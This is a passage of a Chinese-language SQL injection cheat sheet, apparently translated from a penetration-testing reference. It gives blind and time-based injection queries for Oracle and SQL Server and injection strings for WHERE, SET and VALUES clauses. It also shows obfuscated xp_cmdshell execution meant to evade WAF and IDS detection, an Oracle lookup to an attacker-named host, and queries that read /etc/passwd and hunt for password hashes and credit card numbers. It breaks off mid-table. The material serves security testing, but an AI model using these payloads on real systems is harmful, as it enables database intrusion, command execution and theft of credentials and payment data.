部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本是12.2</td><td style="text-align:center">SELECT COUNT(*) FROM v$version WHERE banner LIKE ‘Oracle%12.2%’;</td></tr><tr><td>子选择启用</td><td style="text-align:center">SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)</td></tr><tr><td>表log_table存在</td><td style="text-align:center">SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);</td></tr><tr><td>列message存在于表log_table中</td><td style="text-align:center">Select COUNT(*) from user_tab_cols where column_name = ‘MESSAGE’ and table_name = ‘LOG_TABLE’;</td></tr><tr><td>第一条message的第一个字母是t</td><td style="text-align:center">Select message from log_table where rownum=1 and message LIKE ‘t%’;</td></tr></tbody></table><p><strong>将部分盲查询转换为全盲查询</strong></p><p>　　通过使用以下转换，可以在全盲方案中使用上述任何查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (*PARTIAL_BLIND_QUERY*)=<span class="number">1</span> <span class="keyword">THEN</span> (<span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> all_users a, all_users b, all_users c, all_users d) <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure><p>　　部分盲查询必须返回一行，因此总是尝试在所选列上使用COUNT。添加”all_users [letter]”，直到数据库响应变慢。 如果数据库缓存响应，您可能需要循环[letter]。</p><p><strong>全盲</strong></p><p>　　全盲查询不会在HTTP / HTML响应中指示任何查询结果。这使他们依赖于定时功能和其他<a href="#dataExfiltration">out-of-band</a> 攻击方法。一个真的SQL语句需要X秒的回应，一个假的SQL语句应该立即返回。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本是12.2</td><td style="text-align:center">SELECT CASE WHEN (SELECT COUNT(*) FROM v$version WHERE banner LIKE ‘Oracle%11.2%’)=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual</td></tr></tbody></table><h4 id="SQL-Server-3"><a href="#SQL-Server-3" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><strong>部分盲</strong></p><p>　　部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本是12.0.2000.8</td><td style="text-align:center">SELECT @@version WHERE @@version LIKE ‘%12.0.2000.8%’</td></tr><tr><td>子选择启用</td><td style="text-align:center">SELECT (SELECT @@version)</td></tr><tr><td>表log_table存在</td><td style="text-align:center">SELECT * FROM log_table</td></tr><tr><td>列message存在于表log_table中</td><td style="text-align:center">SELECT message from log_table</td></tr><tr><td>第一条message的第一个字母是t</td><td style="text-align:center">WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like ‘t%’</td></tr></tbody></table><p><strong>将部分盲查询转换为全盲查询</strong></p><p>　　通过使用以下转换，可以在全盲方案中使用上述任何查询：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF exists(*PARTIAL_BLIND_QUERY*) WAITFOR DELAY '00:00:02'</span><br></pre></td></tr></table></figure><p><strong>全盲</strong></p><p>　　全盲查询不会在HTTP / HTML响应中指示任何查询结果。这使他们依赖于定时功能和其他<a href="#dataExfiltration">out-of-band</a> 攻击方法。一个真的SQL语句需要X秒的回应，一个假的SQL语句应该立即返回。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>Version is 12.0.2000.8</td><td style="text-align:center">IF exists(SELECT @@version where @@version like ‘%12.0.2000.8%’) WAITFOR DELAY ‘00&#58;00&#58;02’</td></tr></tbody></table><h2 id="4-注入技术"><a href="#4-注入技术" class="headerlink" title="4.注入技术"></a>4.注入技术</h2><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p>　　条件语句有助于创建复杂的查询并帮助盲注入。</p><p><strong>MySQL</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>If/Else</td><td style="text-align:center">SELECT IF(1=2,’true’,’false’)</td></tr><tr><td>逻辑 OR</td><td style="text-align:center">SELECT 1 &#124;&#124; 0<br> 看到这个运算符的细微差别<a href="https://dev.mysql.com/doc/refman/5.7/en/logical-operators.html#operator_or" target="_blank" rel="noopener">详见</a></td></tr></tbody></table><p><strong>Oracle</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>Case</td><td style="text-align:center">SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>Case</td><td style="text-align:center">SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END</td></tr><tr><td>If/Else</td><td style="text-align:center">IF 1=2 SELECT ‘true’ ELSE SELECT ‘false’;</td></tr></tbody></table><p>###　注入定位</p><p>　　当注入发生的地方并不明显时，SQL注入总是很麻烦。有一些方法可以在查询的各个部分利用注入是有帮助的。</p><p>　　<code>$injection</code>确定注入点。修改数据的注入尝试始终使用连接，并允许查询的其余部分有效。通过<a href="https://blog.netspi.com/sql-injection-help-sleep-night/" target="_blank" rel="noopener">这个文章</a>可以了解更多信息。</p><p><strong>MySQL</strong></p><table><thead><tr><th>注入位置</th><th style="text-align:center">语句</th><th style="text-align:center">注入字符串</th></tr></thead><tbody><tr><td>SELECT -&gt; WHERE</td><td style="text-align:center">SELECT * FROM USERS WHERE USER=’$injection’;</td><td style="text-align:center">‘ or 1=1 –</td></tr><tr><td>UPDATE -&gt; SET</td><td style="text-align:center">UPDATE USERS SET email=’$injection’ WHERE user=’NetSPI’;</td><td style="text-align:center">‘ <a href="mailto:&#39;harold@netspi.com" target="_blank" rel="noopener">&#39;harold@netspi.com</a>‘ ‘</td></tr><tr><td>UPDATE -&gt; WHERE<br>注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。</td><td style="text-align:center">UPDATE USERS SET <a href="mailto:email=&#39;harold@netspi.com" target="_blank" rel="noopener">email=&#39;harold@netspi.com</a>‘ WHERE user=’$injection’;</td><td style="text-align:center">‘ ‘netspi’ ‘</td></tr><tr><td>DELETE -&gt; WHERE<br>注意：运行删除语句时要非常小心，因为整个表都会被删除。</td><td style="text-align:center">DELETE FROM USERS WHERE USERS=’$injection’;</td><td style="text-align:center">‘ <a href="mailto:&#39;harold@netspi.com" target="_blank" rel="noopener">&#39;harold@netspi.com</a>‘ ‘</td></tr></tbody></table><p><strong>Oracle</strong></p><table><thead><tr><th>注入位置</th><th style="text-align:center">语句</th><th style="text-align:center">注入字符串</th></tr></thead><tbody><tr><td>SELECT -&gt; WHERE</td><td style="text-align:center">SELECT user FROM dual WHERE user LIKE ‘$injection’;</td><td style="text-align:center">‘&#124;&#124;’USER%’&#124;&#124;’</td></tr><tr><td>INSERT -&gt; VALUES</td><td style="text-align:center">INSERT INTO log_table (message) VALUES (‘$injection’);</td><td style="text-align:center">‘&#124;&#124;(select user from dual)&#124;&#124;’</td></tr><tr><td>UPDATE -&gt; SET</td><td style="text-align:center">UPDATE log_table SET message = ‘$injection’ WHERE message = ‘test’;</td><td style="text-align:center">‘&#124;&#124;(select user from dual)&#124;&#124;</td></tr><tr><td>UPDATE -&gt; WHERE<br>注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。</td><td style="text-align:center">UPDATE log_table SET message = ‘test’ WHERE message = ‘$injection’;</td><td style="text-align:center">‘&#124;&#124;’Injected’&#124;&#124;’</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>注入位置</th><th style="text-align:center">语句</th><th style="text-align:center">注入字符串</th></tr></thead><tbody><tr><td>SELECT -&gt; WHERE</td><td style="text-align:center">SELECT * FROM USERS WHERE “USER”=’$injection’;</td><td style="text-align:center">‘ or 1=1 –</td></tr><tr><td>UPDATE -&gt; SET</td><td style="text-align:center">UPDATE USERS SET “email”=’$injection’ WHERE “USER”=’NetSPI’;</td><td style="text-align:center"><a href="mailto:&#39;+&#39;harold@netspi.com" target="_blank" rel="noopener">&#39;+&#39;harold@netspi.com</a>‘+’</td></tr><tr><td>UPDATE -&gt; WHERE<br>注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。</td><td style="text-align:center">UPDATE USERS SET “email”<a href="mailto:=&#39;harold@netspi.com" target="_blank" rel="noopener">=&#39;harold@netspi.com</a>‘ WHERE “USER”=’$injection’;</td><td style="text-align:center">‘+’NetSPI’+’</td></tr><tr><td>DELETE -&gt; WHERE</td><td style="text-align:center">DELETE USERS WHERE “User”=’$injection’;</td><td style="text-align:center">‘+’NetSPI’+’</td></tr><tr><td>INSERT -&gt; VALUES</td><td style="text-align:center">INSERT INTO USERS ([User], [Password]) VALUES (‘$injection’, ‘password’);</td><td style="text-align:center">‘+(select @@version)+’</td></tr></tbody></table><p>###　混淆查询</p><p>　　混淆查询帮助绕过Web应用程序防火墙（WAF）和入侵检测/预防系统（IDS / IPS）。以下是基本查询混淆的示例，它们在应用于某些注入之前可能需要进行修改。</p><p><strong>MySQL</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>ASCII&gt;字符</td><td style="text-align:center">SELECT char（65）</td></tr><tr><td>字符&gt; ASCII</td><td style="text-align:center">SELECT ascii（’A’）</td></tr><tr><td>十六进制</td><td style="text-align:center">SELECT 0x4A414B45</td></tr><tr><td>Hex&gt; Int</td><td style="text-align:center">SELECT 0x20 + 0x40</td></tr><tr><td>按位与</td><td style="text-align:center">SELECT 6 &amp; 2</td></tr><tr><td>按位或</td><td style="text-align:center">SELECT 6</td></tr><tr><td>按位否定</td><td style="text-align:center">SELECT ~6</td></tr><tr><td>按位XOR</td><td style="text-align:center">SELECT 6 ^ 2</td></tr><tr><td>右移</td><td style="text-align:center">SELECT 6&gt;&gt;2</td></tr><tr><td>左移</td><td style="text-align:center">SELECT 6&lt;&lt;2</td></tr><tr><td>字符串截取</td><td style="text-align:center">SELECT substr(‘abcd’, 3, 2)<br> substr(string, index, length)</td></tr><tr><td>Casting</td><td style="text-align:center">SELECT cast(‘1’ AS unsigned integer)<br>SELECT cast(‘123’ AS char)</td></tr><tr><td>字符串连接</td><td style="text-align:center">SELECT concat(‘net’,’spi’)<br>SELECT ‘n’ ‘et’ ‘spi’</td></tr><tr><td>无引号</td><td style="text-align:center">SELECT CONCAT(CHAR(74),CHAR(65),CHAR(75),CHAR(69))</td></tr><tr><td>块注释</td><td style="text-align:center">SELECT/*block<br> comment*/“test”</td></tr><tr><td>单行注释</td><td style="text-align:center">SELECT 1 – comments out rest of line<br>SELECT 1 # comments out rest of line</td></tr><tr><td>无空格</td><td style="text-align:center">SELECT(username)FROM(USERS)WHERE(username=’netspi’)</td></tr><tr><td>允许空白</td><td style="text-align:center">09, 0A, 0B, 0C, 0D, A0, 20</td></tr><tr><td>URL 编码</td><td style="text-align:center">SELECT%20%2A%20FROM%20USERS</td></tr><tr><td>双URL编码</td><td style="text-align:center">SELECT%2520%2A%2520FROM%2520USERS</td></tr><tr><td>无效百分号编码</td><td style="text-align:center">%SEL%ECT * F%R%OM U%S%ERS</td></tr></tbody></table><p>　　进一步阅读请<a href="https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf" target="_blank" rel="noopener">点击</a></p><p><strong>Oracle</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>ASCII&gt;字符</td><td style="text-align:center">SELECT char(65) from dual</td></tr><tr><td>字符&gt; ASCII</td><td style="text-align:center">SELECT ascii(‘A’) from dual</td></tr><tr><td>按位AND</td><td style="text-align:center">SELECT 6 &amp; 2 from dual</td></tr><tr><td>按位或</td><td style="text-align:center">SELECT 6 from dual</td></tr><tr><td>按位否定</td><td style="text-align:center">SELECT ~6 from dual</td></tr><tr><td>按位XOR</td><td style="text-align:center">SELECT 6 ^ 2 from dual</td></tr><tr><td>选择第N个字符</td><td style="text-align:center">SELECT substr(‘abcd’, 3, 1) FROM dual; – Returns 3rd charcter, ‘c’</td></tr><tr><td>字符串截取</td><td style="text-align:center">SELECT substr(‘abcd’, 3, 2) from dual<br>substr(string, index, length)</td></tr><tr><td>Cast</td><td style="text-align:center">select CAST(12 AS CHAR(32)) from dual</td></tr><tr><td>字符串连接</td><td style="text-align:center">SELECT concat(‘net’,’spi’) from dual</td></tr><tr><td>注释</td><td style="text-align:center">SELECT 1 FROM dual – comment</td></tr><tr><td>If 语句</td><td style="text-align:center">BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF;</td></tr><tr><td>Case 语句</td><td style="text-align:center">SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; – Returns 1<br>SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; – Returns 2</td></tr><tr><td>时间延迟</td><td style="text-align:center">BEGIN DBMS_LOCK.SLEEP(5); END; (Requires Privileges)<br>SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual;<br>SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual;<br>SELECT UTL_HTTP.REQUEST(‘<a href="http://google.com&#39;" target="_blank" rel="noopener">http://google.com&#39;</a>) FROM dual;</td></tr><tr><td>选择第n行</td><td style="text-align:center">SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; – Returns 9th row</td></tr><tr><td>按位与</td><td style="text-align:center">SELECT bitand(6,2) FROM dual; – Returns 2<br> SELECT bitand(6,1) FROM dual; – Returns 0</td></tr><tr><td>字符串连接</td><td style="text-align:center">SELECT ‘A’ &#124;&#124; ‘B’ FROM dual; – Returns AB</td></tr><tr><td>避免引号</td><td style="text-align:center">SELECT chr(65) &#124;&#124; chr(66) FROM dual; – Returns AB</td></tr><tr><td>16进制编码</td><td style="text-align:center">SELECT 0x75736572 FROM dual;</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>ASCII&gt;字符</td><td style="text-align:center">SELECT char（65）</td></tr><tr><td>字符&gt; ASCII</td><td style="text-align:center">SELECT ascii（’A’）</td></tr><tr><td>Hex&gt; Int</td><td style="text-align:center">SELECT 0x20 + 0x40</td></tr><tr><td>按位AND</td><td style="text-align:center">SELECT 6 &amp; 2</td></tr><tr><td>按位或</td><td style="text-align:center">SELECT 6</td></tr><tr><td>按位否定</td><td style="text-align:center">SELECT ~6</td></tr><tr><td>按位XOR</td><td style="text-align:center">SELECT 6 ^ 2</td></tr><tr><td>字符串截取</td><td style="text-align:center">SELECT substring(‘abcd’, 3, 2)<br> substring(string, index, length)</td></tr><tr><td>Casting</td><td style="text-align:center">SELECT cast(‘1’ AS unsigned integer)<br> SELECT cast(‘123’ AS char)</td></tr><tr><td>字符串连接</td><td style="text-align:center">SELECT concat(‘net’,’spi’)</td></tr><tr><td>注释</td><td style="text-align:center">SELECT 1 –comment<br>SELECT/*comment*/1</td></tr><tr><td>避免引号</td><td style="text-align:center">SELECT char(65)+char(66) – returns AB</td></tr><tr><td>使用％0d避免使用分号</td><td style="text-align:center"><code>%0dwaitfor+delay+&#39;0:0:10&#39;--</code></td></tr><tr><td>Bypass Filtering</td><td style="text-align:center">EXEC xP_cMdsheLL ‘dir’;</td></tr><tr><td>用注释避免空格</td><td style="text-align:center">EXEC/**/xp_cmdshell/**/‘dir’;– ‘;ex/**/ec xp_cmds/**/hell ‘dir’;</td></tr><tr><td>用连接避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(3000);<br>SET @cmd = ‘x’+’p’+’_’+’c’+’m’+’d’+’s’+’h’+’e’+’l’+’l’+’/**/‘+””+’d’+’i’+’r’+””;<br>exec(@cmd);</td></tr><tr><td>用字符编码避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(3000);<br>SET @cmd =(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+<br>CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)<br>+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+<br>CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+<br>CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+<br>CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));<br>EXEC(@cmd);</td></tr><tr><td>用base64编码避免查询检测</td><td style="text-align:center">DECLARE @data varchar(max), @XmlData xml;SET @data = ‘ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn’;<br>SET @XmlData = CAST(‘’ + @data + ‘’ as xml);SET @data = CONVERT(varchar(max), @XmlData.value(‘(data)[1]’, ‘varbinary(max)’));<br>exec (@data);</td></tr><tr><td>用Nchar编码避免查询检测</td><td style="text-align:center">DECLARE @cmd as nvarchar(3000);<br>SET @cmd =(nchar(101)+nchar(120)+nchar(101)+nchar(99)+<br> nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+<br>nchar(101)+nchar(114)+nchar(46)+nchar(46)+<br> nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109)<br>+nchar(100)+nchar(115)+nchar(104)+<br> nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100)<br>+nchar(105)+nchar(114)+nchar(39)+nchar(59));<br>EXEC(@cmd);</td></tr><tr><td>用ASCII + CAST 编码避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(MAX);<br>SET @cmd = cast(0x78705F636D647368656C6C202764697227 as varchar(MAX));<br>exec(@cmd);</td></tr><tr><td>用ASCII + CONVERT 编码避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(MAX);<br>SET @cmd = convert(varchar(MAX),0x78705F636D647368656C6C202764697227);<br>exec(@cmd);</td></tr><tr><td>用varbinary(MAX) 避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(MAX);<br>SET @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);<br>exec(@cmd);</td></tr><tr><td>用 sp_sqlexec 避免 EXEC()</td><td style="text-align:center">DECLARE @cmd as varchar(3000);<br>SET @cmd = convert(varchar(0),0×78705F636D647368656C6C202764697227);<br>exec sp_sqlexec @cmd;</td></tr><tr><td>执行 xp_cmdshell ‘dir’</td><td style="text-align:center">DECLARE @tmp as varchar(MAX);<br>SET @tmp = char(88)+char(80)+char(95)+char(67)+char(77)+<br>char(68)+char(83)+char(72)+char(69)+char(76)+char(76);<br>exec @tmp ‘dir’;</td></tr></tbody></table><h2 id="5-攻击查询"><a href="#5-攻击查询" class="headerlink" title="5.攻击查询"></a>5.攻击查询</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>　　收集有关任何测试环境的信息通常很有价值; 版本号，用户帐户和数据库都有助于升级漏洞。以下是常见的方法。</p><p>　　<code>*</code>需要特权用户</p><p><strong>MySQL</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本</td><td style="text-align:center">SELECT @@version</td></tr><tr><td>单个用户</td><td style="text-align:center">SELECT user()<br>SELECT system_user()</td></tr><tr><td>所有用户</td><td style="text-align:center">SELECT user FROM mysql.user<br> <code>*</code>SELECT Super_priv FROM mysql.user WHERE user= ‘root’ LIMIT 1,1</td></tr><tr><td>表</td><td style="text-align:center">SELECT table_schema, table_name FROM information_schema.tables</td></tr><tr><td>列</td><td style="text-align:center">SELECT table_name, column_name FROM information_schema.columns</td></tr><tr><td>数据库</td><td style="text-align:center">SELECT schema_name FROM information_schema.schemata</td></tr><tr><td>当前数据库名称</td><td style="text-align:center">SELECT database()</td></tr><tr><td>查询其他数据库</td><td style="text-align:center">USE [database_name]; SELECT database();<br>SELECT [column] FROM [database_name].[table_name]</td></tr><tr><td>列数</td><td style="text-align:center">SELECT count(*) FROM information_schema.columns WHERE table_name = ‘[table_name]’</td></tr><tr><td>DBA账户</td><td style="text-align:center">SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’</td></tr><tr><td>密码哈希</td><td style="text-align:center">SELECT host, user, password FROM mysql.user</td></tr><tr><td>Schema</td><td style="text-align:center">SELECT schema()</td></tr><tr><td>数据路径</td><td style="text-align:center">SELECT @@datadir</td></tr><tr><td>读取文件</td><td style="text-align:center"><code>*</code> SELECT LOAD_FILE(‘/etc/passwd’)</td></tr></tbody></table><p><strong>Oracle</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本</td><td style="text-align:center">SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;<br>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;<br>SELECT version FROM v$instance;</td></tr><tr><td>单个用户</td><td style="text-align:center">SELECT user FROM dual</td></tr><tr><td>所有用户</td><td style="text-align:center">SELECT username FROM all_users ORDER BY username;<br><code>*</code>SELECT name FROM sys.user$;</td></tr><tr><td>表</td><td style="text-align:center">SELECT table_name FROM all_tables;<br>SELECT owner, table_name FROM all_tables;</td></tr><tr><td>通过列名称获取表</td><td style="text-align:center">SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;</td></tr><tr><td>列</td><td style="text-align:center">SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;<br>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</td></tr><tr><td>当前数据库名称</td><td style="text-align:center">SELECT global_name FROM global_name;<br>SELECT name FROM V$DATABASE;<br>SELECT instance_name FROM V$INSTANCE;<br>SELECT SYS.DATABASE_NAME FROM DUAL;</td></tr><tr><td>数据库</td><td style="text-align:center">SELECT DISTINCT owner FROM all_tables;</td></tr><tr><td>DBA 账户</td><td style="text-align:center">SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’;</td></tr><tr><td>特权</td><td style="text-align:center">SELECT * FROM session_privs;(Retrieves Current Privs)<br> <code>*</code> SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’;<br> <code>*</code> SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’;<br>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td></tr><tr><td>DB文件的位置</td><td style="text-align:center">SELECT name FROM V$DATAFILE;</td></tr><tr><td>主机名，IP地址</td><td style="text-align:center">SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; (IP地址)<br>SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; (主机名)</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本</td><td style="text-align:center">SELECT @@version;</td></tr><tr><td>单个用户</td><td style="text-align:center">SELECT user;<br>SELECT system_user;<br>SELECT user_name();<br>SELECT loginame from master..sysprocesses where spid = @@SPID</td></tr><tr><td>所有用户</td><td style="text-align:center">SELECT name from master..syslogins</td></tr><tr><td>表</td><td style="text-align:center">SELECT table_catalog, table_name FROM information_schema.columns</td></tr><tr><td>列</td><td style="text-align:center">SELECT table_catalog, column_name FROM information_schema.columns</td></tr><tr><td>所有数据库</td><td style="text-align:center">SELECT name from master..sysdatabases;</td></tr><tr><td>当前数据库</td><td style="text-align:center">SELECT db_name();</td></tr><tr><td>服务器名称</td><td style="text-align:center">SELECT @@SERVERNAME</td></tr><tr><td>查找存储过程</td><td style="text-align:center">SELECT * from master..sysobjects where name like ‘sp%’ order by name desc</td></tr><tr><td>通过用户名获取SUID</td><td style="text-align:center">SELECT SUSER_ID(‘sa’)</td></tr><tr><td>通过SUID获取用户名</td><td style="text-align:center">SELECT SUSER_NAME(1)</td></tr><tr><td>检查账户是不是管理员</td><td style="text-align:center">IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))<br>SELECT is_srvrolemember(‘sysadmin’);</td></tr><tr><td>Policies</td><td style="text-align:center"><code>SELECT p.policy_id, p.name as [PolicyName], p.condition_id, c.name as [ConditionName], c.facet, c.expression as [ConditionExpression], p.root_condition_id, p.is_enabled, p.date_created, p.date_modified, p.description, p.created_by, p.is_system, t.target_set_id, t.TYPE, t.type_skeleton FROM msdb.dbo.syspolicy_policies p INNER JOIN syspolicy_conditions c ON p.condition_id = c.condition_id INNER JOIN msdb.dbo.syspolicy_target_sets t ON t.object_set_id = p.object_set_id</code></td></tr><tr><td>域用户</td><td style="text-align:center"><a href="https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql" target="_blank" rel="noopener">https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql</a></td></tr><tr><td>DB 审计</td><td style="text-align:center"><code>SELECT a.audit_id, a.name as audit_name, s.name as database_specification_name, d.audit_action_name, d.major_id, OBJECT_NAME(d.major_id) as object, s.is_state_enabled, d.is_group, s.create_date, s.modify_date, d.audited_result FROM sys.server_audits AS a JOIN sys.database_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.database_audit_specification_details AS d ON s.database_specification_id = d.database_specification_id</code></td></tr><tr><td>Server 审计</td><td style="text-align:center"><code>SELECT audit_id, a.name as audit_name, s.name as server_specification_name, d.audit_action_name, s.is_state_enabled, d.is_group, d.audit_action_id, s.create_date, s.modify_date FROM sys.server_audits AS a JOIN sys.server_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id = d.server_specification_id</code></td></tr><tr><td>查询历史记录</td><td style="text-align:center"><code>SELECT * FROM (SELECT COALESCE(OBJECT_NAME(qt.objectid),&#39;Ad-Hoc&#39;) AS objectname, qt.objectid as objectid, last_execution_time, execution_count, encrypted,(SELECT TOP 1 SUBSTRING(qt.TEXT,statement_start_offset / 2+1,( (CASE WHEN statement_end_offset = -1 THEN (LEN(CONVERT(NVARCHAR(MAX),qt.TEXT)) * 2) ELSE statement_end_offset END)- statement_start_offset) / 2+1)) AS sql_statement FROM sys.dm_exec_query_stats AS qs CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS qt ) x ORDER BY execution_count DESC</code></td></tr></tbody></table><h3 id="数据定位"><a href="#数据定位" class="headerlink" title="数据定位"></a>数据定位</h3><p>　　能够正确地识别和定位敏感信息可以以指数的方式减少在数据库中花费的时间，这意味着可以花费更多的时间在其他方向上。</p><h4 id="数据定位查询"><a href="#数据定位查询" class="headerlink" title="数据定位查询"></a>数据定位查询</h4><p><strong>MySQL</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>数据库大小</td><td style="text-align:center"><code>SELECT table_schema &quot;Database Name&quot;,sum( data_length + index_length ) / 1024 / 1024 &quot;Database Size in MB&quot;,sum( data_free )/ 1024 / 1024 &quot;Free Space in MB&quot; FROM information_schema.TABLES GROUP BY table_schema ;</code></td></tr><tr><td>数据库名称关键字</td><td style="text-align:center"><code>SELECT table_schema &quot;Database Name&quot; FROM information_schema.TABLES WHERE table_schema LIKE &quot;%passwords%&quot; GROUP BY table_schema ;</code></td></tr><tr><td>表名关键字</td><td style="text-align:center"><code>SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE &quot;information_schema&quot; AND table_name LIKE &quot;%admin%&quot;;</code></td></tr><tr><td>列名关键字</td><td style="text-align:center"><code>SELECT column_name, table_name FROM information_schema.columns WHERE column_name LIKE &quot;%password%&quot;;</code></td></tr><tr><td>列数据正则表达式</td><td style="text-align:center"><code>SELECT * from credit_cards WHERE cc_number REGEXP &#39;^4[0-9]{15}$&#39;;</code></td></tr></tbody></table><p><strong>Oracle</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>寻找敏感数据</td><td style="text-align:center">SELECT owner,table_name,column_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;</td></tr><tr><td>寻找特权</td><td style="text-align:center">SELECT * FROM session_privs<br> SELECT * FROM USER_SYS_PRIVS<br> SELECT * FROM USER_TAB_PRIVS<br>SELECT * FROM USER_TAB_PRIVS_MADE<br>SELECT * FROM USER_TAB_PRIVS_RECD<br>SELECT * FROM ALL_TAB_PRIVS<br>SELECT * FROM USER_ROLE_PRIVS</td></tr><tr><td>提取存储过程/ Java源</td><td style="text-align:center">SELECT * FROM all_source WHERE owner NOT IN (‘SYS’,’SYSTEM’)<br>SELECT * FROM all_source WHERE TYPE LIKE ‘%JAVA %’<br>SELECT TO_CHAR(DBMS_METADATA.get_ddl(‘TABLE’,’DEPT’,’CONSUELA’)) FROM dual</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>描述</th><th 